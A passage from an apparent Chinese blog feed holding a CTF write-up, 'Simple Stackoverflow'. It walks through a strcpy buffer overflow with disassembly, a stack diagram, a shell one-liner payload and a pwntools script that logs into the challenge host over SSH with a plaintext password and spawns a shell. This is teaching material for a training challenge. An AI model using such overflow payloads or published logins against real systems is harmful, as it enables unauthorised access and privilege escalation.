target_program.recv(timeout=5)  # 接收最多 5 秒的输出<br>    print(output.decode())  # 输出接收到的内容<br>except Exception as e:<br>    print(f&quot;Error: &#123;e&#125;&quot;)<br><br># 如果需要进一步交互，可以使用 interactive() 函数进入交互模式<br>target_program.interactive()<br></code></pre></td></tr></table></figure><img src="/2025/03/11/ret2shellcode/result.png" class="">]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
    </categories>
    
    
    <tags>
      
      <tag>二进制  漏洞  CTF</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Simple Stackoverflow</title>
    <link href="/2025/03/10/simple-stackoverflow/"/>
    <url>/2025/03/10/simple-stackoverflow/</url>
    
    <content type="html"><![CDATA[<h2 id="GE4xD">摘要</h2><p>闲来无事做几个简单的pwn玩玩: Simple Stackoverflow</p><h2 id="GE4xD">题目：</h2><img src="/2025/03/10/simple-stackoverflow/challenge1.png" class=""><img src="/2025/03/10/simple-stackoverflow/challenge2.png" class=""><img src="/2025/03/10/simple-stackoverflow/challenge3.png" class=""><h2 id="fOMlb">代码：</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdint.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> EXPECTED 0xdeadbeefdeadbeef</span><br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span> **argv)</span></span><br><span class="hljs-function"></span>&#123;<br>        <span class="hljs-type">char</span> buf[<span class="hljs-number">64</span>];<br>        <span class="hljs-type">uint64_t</span> n = <span class="hljs-number">0x1337</span>;<br><br>        <span class="hljs-keyword">if</span> (argc != <span class="hljs-number">2</span>)<br>        &#123;<br>                <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Please supply a single argument\n&quot;</span>);<br>                <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>        &#125;<br><br>        <span class="hljs-built_in">strcpy</span>(buf, argv[<span class="hljs-number">1</span>]);<br><br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Expected value of n: %016lX\n&quot;</span>, EXPECTED);  <br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Actual value of n: %016lX\n&quot;</span>, n); <br>                                                   <br>        <span class="hljs-keyword">if</span> (n == EXPECTED)<br>        &#123;<br>                <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;You win!\n&quot;</span>);<br>        <span class="hljs-comment">// This prevents /bin/sh from dropping the privileges</span><br>        <span class="hljs-built_in">setreuid</span>(<span class="hljs-built_in">geteuid</span>(), <span class="hljs-built_in">geteuid</span>());<br>                <span class="hljs-built_in">system</span>(<span class="hljs-string">&quot;/bin/sh&quot;</span>);<br>        &#125;<br>        <span class="hljs-keyword">else</span><br>        &#123;<br>                <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;You lose!\n&quot;</span>);<br>        &#125;<br><br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br></code></pre></td></tr></table></figure><h2 id="wFAhW">分析</h2>这里面使用了 strcpy 函数，并且没有校验用户输入的字符串长度，直接copy进入 buf 中，会导致缓冲区溢出的风险，从而覆盖 n 变量为我们想要的值<blockquote><p>这里面有一个小的注意点，虽然这里面数组是比变量更早声明，但是实际上在地址分布中数组的地址更低，而数组是从低地址向高地址生长的，因此可以覆盖到更高地址的变量</p></blockquote><p>我们在本地使用 gcc 编译然后使用逆向工具对代码进行分析，找到两个变量的相对地址，从而构造我们的payload</p><p>文件下载并检查保护</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">scp pwn024@pwn.baectf.com:/home/pwn024/runme ./runme<br>checksec runme<br></code></pre></td></tr></table></figure><img src="/2025/03/10/simple-stackoverflow/checksec.png" class=""><p>查看文件平台 x86-64</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs plain">ubuntu@VM-0-10-ubuntu:~/ctf/stackoverflow/ret2text$ file runme <br>runme: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=ce0f1730a4b9bd7a58b681b3f691910d28da1a0a, not stripped<br></code></pre></td></tr></table></figure><h2 id="Tj5Oz">编译</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cpp">gcc -fno-stack-protector -z noexecstack -g stack.c -o stack_pwn<br></code></pre></td></tr></table></figure><h2 id="MgceH">pwndbg</h2><p>命令可以参考：<a href="https://www.cnblogs.com/XiDP0/p/18445567">https://www.cnblogs.com/XiDP0/p/18445567</a></p><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs applescript"><span class="hljs-built_in">file</span> ./stack_pwn<br>disassemble main<br></code></pre></td></tr></table></figure><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><code class="hljs x86asm">Dump of assembler code for function main:<br>   <span class="hljs-number">0x00000000000011e9</span> &lt;+<span class="hljs-number">0</span>&gt;:     endbr64 <br>   <span class="hljs-number">0x00000000000011ed</span> &lt;+<span class="hljs-number">4</span>&gt;:     <span class="hljs-keyword">push</span>   <span class="hljs-built_in">rbp</span><br>   <span class="hljs-number">0x00000000000011ee</span> &lt;+<span class="hljs-number">5</span>&gt;:     <span class="hljs-keyword">mov</span>    <span class="hljs-built_in">rbp</span>,<span class="hljs-built_in">rsp</span><br>   <span class="hljs-number">0x00000000000011f1</span> &lt;+<span class="hljs-number">8</span>&gt;:     <span class="hljs-keyword">push</span>   <span class="hljs-built_in">rbx</span><br>   <span class="hljs-number">0x00000000000011f2</span> &lt;+<span class="hljs-number">9</span>&gt;:     <span class="hljs-keyword">sub</span>    <span class="hljs-built_in">rsp</span>,<span class="hljs-number">0x68</span><br>   <span class="hljs-number">0x00000000000011f6</span> &lt;+<span class="hljs-number">13</span>&gt;:    <span class="hljs-keyword">mov</span>    <span class="hljs-built_in">DWORD</span> <span class="hljs-built_in">PTR</span> [<span class="hljs-built_in">rbp</span>-<span class="hljs-number">0x64</span>],<span class="hljs-built_in">edi</span><br>   <span class="hljs-number">0x00000000000011f9</span> &lt;+<span class="hljs-number">16</span>&gt;:    <span class="hljs-keyword">mov</span>    <span class="hljs-built_in">QWORD</span> <span class="hljs-built_in">PTR</span> [<span class="hljs-built_in">rbp</span>-<span class="hljs-number">0x70</span>],<span class="hljs-built_in">rsi</span><br>   <span class="hljs-number">0x00000000000011fd</span> &lt;+<span class="hljs-number">20</span>&gt;:    <span class="hljs-keyword">mov</span>    <span class="hljs-built_in">QWORD</span> <span class="hljs-built_in">PTR</span> [<span class="hljs-built_in">rbp</span>-<span class="hljs-number">0x18</span>],<span class="hljs-number">0x1337</span><br>   <span class="hljs-number">0x0000000000001205</span> &lt;+<span class="hljs-number">28</span>&gt;:    <span class="hljs-keyword">cmp</span>    <span class="hljs-built_in">DWORD</span> <span class="hljs-built_in">PTR</span> [<span class="hljs-built_in">rbp</span>-<span class="hljs-number">0x64</span>],<span class="hljs-number">0x2</span><br>   <span class="hljs-number">0x0000000000001209</span> &lt;+<span class="hljs-number">32</span>&gt;:    <span class="hljs-keyword">je</span>     <span class="hljs-number">0x1224</span> &lt;main+<span class="hljs-number">59</span>&gt;<br>   <span class="hljs-number">0x000000000000120b</span> &lt;+<span class="hljs-number">34</span>&gt;:    <span class="hljs-keyword">lea</span>    <span class="hljs-built_in">rax</span>,[<span class="hljs-built_in">rip</span>+<span class="hljs-number">0xdf6</span>]        # <span class="hljs-number">0x2008</span><br>   <span class="hljs-number">0x0000000000001212</span> &lt;+<span class="hljs-number">41</span>&gt;:    <span class="hljs-keyword">mov</span>    <span class="hljs-built_in">rdi</span>,<span class="hljs-built_in">rax</span><br>   <span class="hljs-number">0x0000000000001215</span> &lt;+<span class="hljs-number">44</span>&gt;:    <span class="hljs-keyword">call</span>   <span class="hljs-number">0x10b0</span> &lt;puts@plt&gt;<br>   <span class="hljs-number">0x000000000000121a</span> &lt;+<span class="hljs-number">49</span>&gt;:    <span class="hljs-keyword">mov</span>    <span class="hljs-built_in">eax</span>,<span class="hljs-number">0x1</span><br>   <span class="hljs-number">0x000000000000121f</span> &lt;+<span class="hljs-number">54</span>&gt;:    <span class="hljs-keyword">jmp</span>    <span class="hljs-number">0x12d8</span> &lt;main+<span class="hljs-number">239</span>&gt;<br>   <span class="hljs-number">0x0000000000001224</span> &lt;+<span class="hljs-number">59</span>&gt;:    <span class="hljs-keyword">mov</span>    <span class="hljs-built_in">rax</span>,<span class="hljs-built_in">QWORD</span> <span class="hljs-built_in">PTR</span> [<span class="hljs-built_in">rbp</span>-<span class="hljs-number">0x70</span>]<br>   <span class="hljs-number">0x0000000000001228</span> &lt;+<span class="hljs-number">63</span>&gt;:    <span class="hljs-keyword">add</span>    <span class="hljs-built_in">rax</span>,<span class="hljs-number">0x8</span><br>   <span class="hljs-number">0x000000000000122c</span> &lt;+<span class="hljs-number">67</span>&gt;:    <span class="hljs-keyword">mov</span>    <span class="hljs-built_in">rdx</span>,<span class="hljs-built_in">QWORD</span> <span class="hljs-built_in">PTR</span> [<span class="hljs-built_in">rax</span>]<br>   <span class="hljs-number">0x000000000000122f</span> &lt;+<span class="hljs-number">70</span>&gt;:    <span class="hljs-keyword">lea</span>    <span class="hljs-built_in">rax</span>,[<span class="hljs-built_in">rbp</span>-<span class="hljs-number">0x60</span>]<br>   <span class="hljs-number">0x0000000000001233</span> &lt;+<span class="hljs-number">74</span>&gt;:    <span class="hljs-keyword">mov</span>    <span class="hljs-built_in">rsi</span>,<span class="hljs-built_in">rdx</span><br>   <span class="hljs-number">0x0000000000001236</span> &lt;+<span class="hljs-number">77</span>&gt;:    <span class="hljs-keyword">mov</span>    <span class="hljs-built_in">rdi</span>,<span class="hljs-built_in">rax</span><br>   <span class="hljs-number">0x0000000000001239</span> &lt;+<span class="hljs-number">80</span>&gt;:    <span class="hljs-keyword">call</span>   <span class="hljs-number">0x10a0</span> &lt;strcpy@plt&gt;<br>   <span class="hljs-number">0x000000000000123e</span> &lt;+<span class="hljs-number">85</span>&gt;:    movabs <span class="hljs-built_in">rax</span>,<span class="hljs-number">0xdeadbeefdeadbeef</span><br>   <span class="hljs-number">0x0000000000001248</span> &lt;+<span class="hljs-number">95</span>&gt;:    <span class="hljs-keyword">mov</span>    <span class="hljs-built_in">rsi</span>,<span class="hljs-built_in">rax</span><br>   <span class="hljs-number">0x000000000000124b</span> &lt;+<span class="hljs-number">98</span>&gt;:    <span class="hljs-keyword">lea</span>    <span class="hljs-built_in">rax</span>,[<span class="hljs-built_in">rip</span>+<span class="hljs-number">0xdd6</span>]        # <span class="hljs-number">0x2028</span><br>   <span class="hljs-number">0x0000000000001252</span> &lt;+<span class="hljs-number">105</span>&gt;:   <span class="hljs-keyword">mov</span>    <span class="hljs-built_in">rdi</span>,<span class="hljs-built_in">rax</span><br>   <span class="hljs-number">0x0000000000001255</span> &lt;+<span class="hljs-number">108</span>&gt;:   <span class="hljs-keyword">mov</span>    <span class="hljs-built_in">eax</span>,<span class="hljs-number">0x0</span><br>   <span class="hljs-number">0x000000000000125a</span> &lt;+<span class="hljs-number">113</span>&gt;:   <span class="hljs-keyword">call</span>   <span class="hljs-number">0x10d0</span> &lt;printf@plt&gt;<br>   <span class="hljs-number">0x000000000000125f</span> &lt;+<span class="hljs-number">118</span>&gt;:   <span class="hljs-keyword">mov</span>    <span class="hljs-built_in">rax</span>,<span class="hljs-built_in">QWORD</span> <span class="hljs-built_in">PTR</span> [<span class="hljs-built_in">rbp</span>-<span class="hljs-number">0x18</span>]<br>   <span class="hljs-number">0x0000000000001263</span> &lt;+<span class="hljs-number">122</span>&gt;:   <span class="hljs-keyword">mov</span>    <span class="hljs-built_in">rsi</span>,<span class="hljs-built_in">rax</span><br>   <span class="hljs-number">0x0000000000001266</span> &lt;+<span class="hljs-number">125</span>&gt;:   <span class="hljs-keyword">lea</span>    <span class="hljs-built_in">rax</span>,[<span class="hljs-built_in">rip</span>+<span class="hljs-number">0xdd8</span>]        # <span class="hljs-number">0x2045</span><br>   <span class="hljs-number">0x000000000000126d</span> &lt;+<span class="hljs-number">132</span>&gt;:   <span class="hljs-keyword">mov</span>    <span class="hljs-built_in">rdi</span>,<span class="hljs-built_in">rax</span><br>   <span class="hljs-number">0x0000000000001270</span> &lt;+<span class="hljs-number">135</span>&gt;:   <span class="hljs-keyword">mov</span>    <span class="hljs-built_in">eax</span>,<span class="hljs-number">0x0</span><br>   <span class="hljs-number">0x0000000000001275</span> &lt;+<span class="hljs-number">140</span>&gt;:   <span class="hljs-keyword">call</span>   <span class="hljs-number">0x10d0</span> &lt;printf@plt&gt;<br>   <span class="hljs-number">0x000000000000127a</span> &lt;+<span class="hljs-number">145</span>&gt;:   movabs <span class="hljs-built_in">rax</span>,<span class="hljs-number">0xdeadbeefdeadbeef</span><br>   <span class="hljs-number">0x0000000000001284</span> &lt;+<span class="hljs-number">155</span>&gt;:   <span class="hljs-keyword">cmp</span>    <span class="hljs-built_in">QWORD</span> <span class="hljs-built_in">PTR</span> [<span class="hljs-built_in">rbp</span>-<span class="hljs-number">0x18</span>],<span class="hljs-built_in">rax</span><br>   <span class="hljs-number">0x0000000000001288</span> &lt;+<span class="hljs-number">159</span>&gt;:   <span class="hljs-keyword">jne</span>    <span class="hljs-number">0x12c4</span> &lt;main+<span class="hljs-number">219</span>&gt;<br>   <span class="hljs-number">0x000000000000128a</span> &lt;+<span class="hljs-number">161</span>&gt;:   <span class="hljs-keyword">lea</span>    <span class="hljs-built_in">rax</span>,[<span class="hljs-built_in">rip</span>+<span class="hljs-number">0xdcf</span>]        # <span class="hljs-number">0x2060</span><br>   <span class="hljs-number">0x0000000000001291</span> &lt;+<span class="hljs-number">168</span>&gt;:   <span class="hljs-keyword">mov</span>    <span class="hljs-built_in">rdi</span>,<span class="hljs-built_in">rax</span><br>   <span class="hljs-number">0x0000000000001294</span> &lt;+<span class="hljs-number">171</span>&gt;:   <span class="hljs-keyword">call</span>   <span class="hljs-number">0x10b0</span> &lt;puts@plt&gt;<br>   <span class="hljs-number">0x0000000000001299</span> &lt;+<span class="hljs-number">176</span>&gt;:   <span class="hljs-keyword">call</span>   <span class="hljs-number">0x10e0</span> &lt;geteuid@plt&gt;<br>   <span class="hljs-number">0x000000000000129e</span> &lt;+<span class="hljs-number">181</span>&gt;:   <span class="hljs-keyword">mov</span>    <span class="hljs-built_in">ebx</span>,<span class="hljs-built_in">eax</span><br>   <span class="hljs-number">0x00000000000012a0</span> &lt;+<span class="hljs-number">183</span>&gt;:   <span class="hljs-keyword">call</span>   <span class="hljs-number">0x10e0</span> &lt;geteuid@plt&gt;<br>   <span class="hljs-number">0x00000000000012a5</span> &lt;+<span class="hljs-number">188</span>&gt;:   <span class="hljs-keyword">mov</span>    <span class="hljs-built_in">esi</span>,<span class="hljs-built_in">ebx</span><br>   <span class="hljs-number">0x00000000000012a7</span> &lt;+<span class="hljs-number">190</span>&gt;:   <span class="hljs-keyword">mov</span>    <span class="hljs-built_in">edi</span>,<span class="hljs-built_in">eax</span><br>   <span class="hljs-number">0x00000000000012a9</span> &lt;+<span class="hljs-number">192</span>&gt;:   <span class="hljs-keyword">call</span>   <span class="hljs-number">0x10f0</span> &lt;setreuid@plt&gt;<br>   <span class="hljs-number">0x00000000000012ae</span> &lt;+<span class="hljs-number">197</span>&gt;:   <span class="hljs-keyword">lea</span>    <span class="hljs-built_in">rax</span>,[<span class="hljs-built_in">rip</span>+<span class="hljs-number">0xdb4</span>]        # <span class="hljs-number">0x2069</span><br>   <span class="hljs-number">0x00000000000012b5</span> &lt;+<span class="hljs-number">204</span>&gt;:   <span class="hljs-keyword">mov</span>    <span class="hljs-built_in">rdi</span>,<span class="hljs-built_in">rax</span><br>   <span class="hljs-number">0x00000000000012b8</span> &lt;+<span class="hljs-number">207</span>&gt;:   <span class="hljs-keyword">mov</span>    <span class="hljs-built_in">eax</span>,<span class="hljs-number">0x0</span><br>   <span class="hljs-number">0x00000000000012bd</span> &lt;+<span class="hljs-number">212</span>&gt;:   <span class="hljs-keyword">call</span>   <span class="hljs-number">0x10c0</span> &lt;system@plt&gt;<br>   <span class="hljs-number">0x00000000000012c2</span> &lt;+<span class="hljs-number">217</span>&gt;:   <span class="hljs-keyword">jmp</span>    <span class="hljs-number">0x12d3</span> &lt;main+<span class="hljs-number">234</span>&gt;<br>   <span class="hljs-number">0x00000000000012c4</span> &lt;+<span class="hljs-number">219</span>&gt;:   <span class="hljs-keyword">lea</span>    <span class="hljs-built_in">rax</span>,[<span class="hljs-built_in">rip</span>+<span class="hljs-number">0xda6</span>]        # <span class="hljs-number">0x2071</span><br>   <span class="hljs-number">0x00000000000012cb</span> &lt;+<span class="hljs-number">226</span>&gt;:   <span class="hljs-keyword">mov</span>    <span class="hljs-built_in">rdi</span>,<span class="hljs-built_in">rax</span><br>   <span class="hljs-number">0x00000000000012ce</span> &lt;+<span class="hljs-number">229</span>&gt;:   <span class="hljs-keyword">call</span>   <span class="hljs-number">0x10b0</span> &lt;puts@plt&gt;<br>   <span class="hljs-number">0x00000000000012d3</span> &lt;+<span class="hljs-number">234</span>&gt;:   <span class="hljs-keyword">mov</span>    <span class="hljs-built_in">eax</span>,<span class="hljs-number">0x0</span><br>   <span class="hljs-number">0x00000000000012d8</span> &lt;+<span class="hljs-number">239</span>&gt;:   <span class="hljs-keyword">mov</span>    <span class="hljs-built_in">rbx</span>,<span class="hljs-built_in">QWORD</span> <span class="hljs-built_in">PTR</span> [<span class="hljs-built_in">rbp</span>-<span class="hljs-number">0x8</span>]<br>   <span class="hljs-number">0x00000000000012dc</span> &lt;+<span class="hljs-number">243</span>&gt;:   <span class="hljs-keyword">leave</span>  <br>   <span class="hljs-number">0x00000000000012dd</span> &lt;+<span class="hljs-number">244</span>&gt;:   <span class="hljs-keyword">ret</span>    <br>End of assembler dump.<br></code></pre></td></tr></table></figure><p>我们找一下 变量 n 的地址在哪，很明显，根据赋值0x1337 知道 rbp-0x18 就是 n的地址</p><img src="/2025/03/10/simple-stackoverflow/n-address.png" class=""><p>我们重点看 strcopy 从而可以定位到 buf 的地址，通常函数的第一个参数存储在 edi 第二个参数存储在 esi, 因此我们知道 rax 的地址就是 rdi, rbp-0x60 就是 buf 的地址</p><img src="/2025/03/10/simple-stackoverflow/rax.png" class=""><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs x86asm">这里补充一下汇编相关的知识：<br>关于 [] 在汇编中的作用有两个，一个是地址的解引用，也就是说取方框内的地址中存储的值，另一个就是表示地址的运算，具体使用场景根据运算符号的不同有不同的要求，例如 <span class="hljs-keyword">mov</span> 和 <span class="hljs-keyword">lea</span> 对待这个符号的理解是不同的<br>解引用：当你需要从某个地址加载数据时，[] 表示内存解引用。比如在 <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rax</span>, [<span class="hljs-built_in">rbx</span>] 中，<span class="hljs-built_in">rbx</span> 是一个地址，[<span class="hljs-built_in">rbx</span>] 表示加载该地址处的内容。<br>计算地址：当你需要计算一个地址并将其存储在寄存器中时，[] 不进行内存访问，而是计算出一个新的地址。比如在 <span class="hljs-keyword">lea</span> <span class="hljs-built_in">rax</span>, [<span class="hljs-built_in">rbx</span>+<span class="hljs-number">8</span>] 中，<span class="hljs-built_in">rbx</span>+<span class="hljs-number">8</span> 是一个新的地址，通过 <span class="hljs-keyword">lea</span> 指令将这个地址加载到寄存器中。<br></code></pre></td></tr></table></figure><p>接下来我么就是计算变量之间的距离，从而构造我们的payload</p><figure class="highlight gherkin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs gherkin">Higher Memory Addresses<br>        +------------------+<br>        |<span class="hljs-string">      ...         </span>|<br>        +------------------+<br>        |<span class="hljs-string">      n           </span>|<span class="hljs-string"> &lt;-- ebp - 0x18 (n占据8字节)</span><br><span class="hljs-string">        +------------------+</span><br><span class="hljs-string">        </span>|<span class="hljs-string">     padding      </span>|<span class="hljs-string"> &lt;-- 从ebp-0x18到ebp-0x60之间的距离为0x48 (72字节)</span><br><span class="hljs-string">        +------------------+</span><br><span class="hljs-string">        </span>|<span class="hljs-string">                  </span>|<br>        |<span class="hljs-string">      buf         </span>|<span class="hljs-string"> &lt;-- ebp - 0x60 (buf数组占据64字节)</span><br><span class="hljs-string">        </span>|<span class="hljs-string">                  </span>|<br>        +------------------+<br>        |<span class="hljs-string">      ...         </span>|<br>Lower Memory Addresses<br></code></pre></td></tr></table></figure><p>从图中可以看到，buf 距离 n 变量的空间之间存在一个 72 字节的空档，因此我们需要填充 72 个字符，然后再把我们需要覆盖的字符输入，payload 如下，注意，因为数据存储使用的是小端序，因此最后的覆盖的字符串要反过来写</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">b&quot;A&quot;*72 + b&quot;\xef\xbe\xad\xde\xef\xbe\xad\xde&quot;<br></code></pre></td></tr></table></figure><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs x86asm">补充一下大端序和小端序：<br>端序（Endianness） 指的是多字节数据（如 <span class="hljs-keyword">int</span>, <span class="hljs-meta">float</span>, double）在 内存中 的存储顺序。<br>● 大端序（Big Endian）：高字节存在低地址，低字节存在高地址<br>● 小端序（Little Endian）：低字节存在低地址，高字节存在高地址<br>记忆方法可以当作填空题：___存在低地址，___存在高地址，大端序就是高字节在前，小端序就是低字节在前<br>同 <span class="hljs-meta">CPU</span> 体系结构选择不同的端序：<br>大端序（Big Endian）<br>● PowerPC, SPARC, IBM Mainframe, 网络协议（TCP/<span class="hljs-built_in">IP</span>）<br>● 适合人类阅读习惯，高字节在前<br>小端序（Little Endian）<br>● x86（Intel, AMD）, ARM（默认小端）<br>● 适合 <span class="hljs-meta">CPU</span> 计算，高字节的高位运算更高效<br></code></pre></td></tr></table></figure><p>我们输入这个paylaod 有两种方式，一种是直接 ssh 到目标主机，另一种是远程</p><h2 id="jMZMn">payload</h2><h3 id="WMlsf">本地执行</h3><figure class="highlight moonscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs moonscript">pwn024@i<span class="hljs-number">-0e928</span><span class="hljs-name">e6d1e91ce83d</span>:~$ ./runme <span class="hljs-string">&quot;$(python3 -c &#x27;import sys; sys.stdout.buffer.write(b&quot;</span>A<span class="hljs-string">&quot;*72 + b&quot;</span>\xef\xbe\xad\xde\xef\xbe\xad\xde<span class="hljs-string">&quot;)&#x27;)&quot;</span><br></code></pre></td></tr></table></figure><h3 id="Rbmrm">远程执行</h3><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-keyword">from</span> pwn import *<br><br><span class="hljs-comment"># 设置连接信息</span><br>target_ip = <span class="hljs-string">&#x27;pwn.baectf.com&#x27;</span>  # 远程主机的<span class="hljs-built_in"> IP </span>地址<br>target_port = 22  # 默认的 SSH 端口<br>username = <span class="hljs-string">&#x27;pwn024&#x27;</span>  # SSH 用户名<br>password = <span class="hljs-string">&#x27;gocartmozart&#x27;</span>  # SSH 密码<br>executable_path = <span class="hljs-string">&#x27;./runme&#x27;</span>  # 可执行文件的路径<br><span class="hljs-comment">#payload = b&#x27;A&#x27; * 72 + p64(0xdeadbeefdeadbeef)  # 假设这是你的 payload</span><br>payload  = b<span class="hljs-string">&#x27;A&#x27;</span><span class="hljs-number">*72</span> + p64(0xdeadbeefdeadbeef)<br><span class="hljs-comment"># 通过 SSH 连接到远程主机</span><br>p = ssh(<span class="hljs-attribute">host</span>=target_ip, <span class="hljs-attribute">user</span>=username, <span class="hljs-attribute">password</span>=password, <span class="hljs-attribute">port</span>=target_port)<br><br><span class="hljs-comment"># 在远程主机上执行可执行文件，并传递 payload 作为命令行参数</span><br>target_program = p.process([executable_path, payload])<br><br><span class="hljs-comment"># 获取程序的输出并打印</span><br>try:<br>    # 设置超时时间为 5 秒<br>    output = target_program.recv(<span class="hljs-attribute">timeout</span>=5)  # 接收最多 5 秒的输出<br>    <span class="hljs-built_in">print</span>(output.decode())  # 输出接收到的内容<br>except Exception as e:<br>    <span class="hljs-built_in">print</span>(f<span class="hljs-string">&quot;Error: &#123;e&#125;&quot;</span>)<br><br><span class="hljs-comment"># 如果需要进一步交互，可以使用 interactive() 函数进入交互模式</span><br>target_program.interactive()<br></code></pre></td></tr></table></figure><img src="/2025/03/10/simple-stackoverflow/result.png" class=""><p>这个题目使用IDA分析也是可以的</p><img src="/2025/03/10/simple-stackoverflow/static-analysis.png" class="">]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
    </categories>
    
    
    <tags>
      
      <tag>pwn  漏洞  CTF</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>关于 IP 反查和 CDN 的一些问题</title>
    <link href="/2020/08/20/%E5%85%B3%E4%BA%8E%20IP%20%E5%8F%8D%E6%9F%A5%E5%92%8C%20CDN%20%E7%9A%84%E4%B8%80%E4%BA%9B%E9%97%AE%E9%A2%98/"/>
    <url>/2020/08/20/%E5%85%B3%E4%BA%8E%20IP%20%E5%8F%8D%E6%9F%A5%E5%92%8C%20CDN%20%E7%9A%84%E4%B8%80%E4%BA%9B%E9%97%AE%E9%A2%98/</url>
    
